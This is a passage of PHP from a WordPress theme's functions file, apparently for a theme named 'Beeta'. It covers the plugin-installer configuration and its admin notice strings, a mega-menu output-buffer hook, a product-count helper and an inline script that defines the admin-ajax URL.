			'default_path' => '',                      // Default absolute path to pre-packaged plugins.
			'menu'         => 'tgmpa-install-plugins', // Menu slug.
			'has_notices'  => true,                    // Show admin notices or not.
			'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
			'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
			'is_automatic' => false,                   // Automatically activate plugins after installation or not.
			'message'      => '',                      // Message to output right before the plugins table.
			'strings'      => array(
				'page_title'                      => esc_html__( 'Install Required Plugins', 'beeta' ),
				'menu_title'                      => esc_html__( 'Install Plugins', 'beeta' ),
				'installing'                      => esc_html__( 'Installing Plugin: %s', 'beeta' ), // %s = plugin name.
				'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'beeta' ),
				'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'beeta' ), // %1$s = plugin name(s).
				'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'beeta' ), // %1$s = plugin name(s).
				'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'beeta' ), // %1$s = plugin name(s).
				'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'beeta' ), // %1$s = plugin name(s).
				'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'beeta' ), // %1$s = plugin name(s).
				'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'beeta' ), // %1$s = plugin name(s).
				'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'beeta' ), // %1$s = plugin name(s).
				'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'beeta' ), // %1$s = plugin name(s).
				'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'beeta' ),
				'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'beeta' ),
				'return'                          => esc_html__( 'Return to Required Plugins Installer', 'beeta' ),
				'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'beeta' ),
				'complete'                        => esc_html__( 'All plugins installed and activated successfully. %s', 'beeta' ), // %s = dashboard link.
				'nag_type'                        => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
			)
		);

		tgmpa( $plugins, $config );

	}
}

// Instantiate theme
$Beeta_Class = new Beeta_Class();

//Fix duplicate id of mega menu
function beeta_mega_menu_id_change($params) {
	ob_start('beeta_mega_menu_id_change_call_back');
}
function beeta_mega_menu_id_change_call_back($html){
	//$html = preg_replace('/id="primary"/', 'id="mega_main_menu_first"', $html, 1);
	//$html = preg_replace('/id="main_ul-primary"/', 'id="mega_main_menu_ul_first"', $html, 1);
	
	return $html;
}
function beeta_total_product_count() {
    $args = array( 'post_type' => 'product', 'posts_per_page' => -1 );

    $products = new WP_Query( $args );

    return $products->found_posts;
}
add_action('wp_loaded', 'beeta_mega_menu_id_change');

function beeta_prefix_enqueue_script() {
  	wp_add_inline_script( 'beeta-theme-jquery', 'var ajaxurl = "'.admin_url('admin-ajax.php').'";' ); 
}
add_action( 'wp_enqueue_scripts', 'beeta_prefix_enqueue_script' ); 